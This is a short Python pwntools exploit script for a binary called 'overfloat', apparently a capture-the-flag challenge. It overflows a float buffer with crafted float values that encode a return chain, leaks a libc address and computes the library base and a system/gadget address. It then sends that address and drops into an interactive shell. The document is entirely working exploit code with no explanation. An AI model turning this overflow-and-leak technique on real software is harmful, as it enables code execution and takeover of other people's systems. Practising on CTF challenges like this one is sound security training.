from pwn import *
io=process("./overfloat")
for i in range(12):
	io.recvuntil(":")
	io.sendline("1")
io.recvuntil(":")
io.sendline("8.82787764e-39")
io.sendline("0")
io.sendline("5.88124265e-39")
io.sendline("0")
io.sendline("8.82779917e-39")
io.sendline("0")
io.sendline("5.88067372e-39")
io.sendline("0")
io.sendline("done")
io.recvuntil("BON VOYAGE!")
leak=io.recv(7)
leak=leak[1:]
leak=leak+"\x00\x00"
leak=u64(leak)
print hex(leak)
base=leak-0x26a80
print hex(base)
system=base+0x106ef8
print hex(system)
io.sendline(p64(system))
io.interactive()
